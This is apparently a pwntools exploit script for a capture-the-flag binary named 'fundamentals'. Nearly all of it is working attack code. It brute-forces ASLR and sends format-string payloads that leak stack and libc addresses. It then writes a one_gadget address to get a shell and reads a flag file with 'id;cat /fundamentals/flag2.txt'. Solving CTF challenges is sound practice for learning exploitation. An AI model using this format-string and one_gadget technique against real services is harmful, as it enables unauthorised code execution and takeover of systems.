#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'error'

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

exe = ELF('./fundamentals.patched')
libc = ELF('./libc.so.6')

if args.DOCKER:
  host, port = "127.0.0.1", "3001"
if args.REMOTE:
  host, port = "host1.metaproblems.com", "5470"

# bruteforce libc_main to ret2main
print('Searching for good ASLRs (libc & stack)...')
for j in range(1000):
  context.log_level = 'error'
  if args.DOCKER or args.REMOTE:
    p = connect(host, port)
  else:
    p = process('././fundamentals.patched')
  # 19 cars prelude
  payload = '%p.%p.%c%c%c%*c'+'%c'*30+'%'+str(200-63)+'c'+'%hn'+'%9c'+'%65$hhnTOTO'
  p.sendlineafter('guess?\n', payload)
  try:
    p.readuntil('0x', drop=True)
    # we read stack leak, until ASLR is ok for us (0xff000000)
    leak = int(p.readuntil('.', drop=True),16)
    leak2 = int(p.readuntil('.', drop=True),16)
    if (((leak & 0xff000000)>>24) > 7) or (((leak2 & 0xff000000)>>24) > 15):
      p.close()
      print(str(j))
      continue
    # ASLR OK
    print('leak ='+hex(leak)+'     leak2 = '+hex(leak2))
    libc.address = leak2 - 0x1bd8c0
    print('wait, finishing receiving data...')
    sys.stdout.flush()
    p.recvuntil('TOTO', drop=True)
    p.recvuntil('What is your guess?\n', drop=True)
    print('guess OK.')
    print('libc base = '+hex(libc.address))
    onegadgets = one_gadget('libc.so.6', libc.address)
    payload = '%'+str(onegadgets[0] & 0xffffffff)+'c'+'%65$nTOTO'
    print('wait, trying to send one gadget...')
    p.sendline(payload)
    p.recvuntil('TOTO',drop=True)
    p.sendline('id;cat /fundamentals/flag2.txt')
    p.interactive()
    break
  except:
    p.close()
    continue

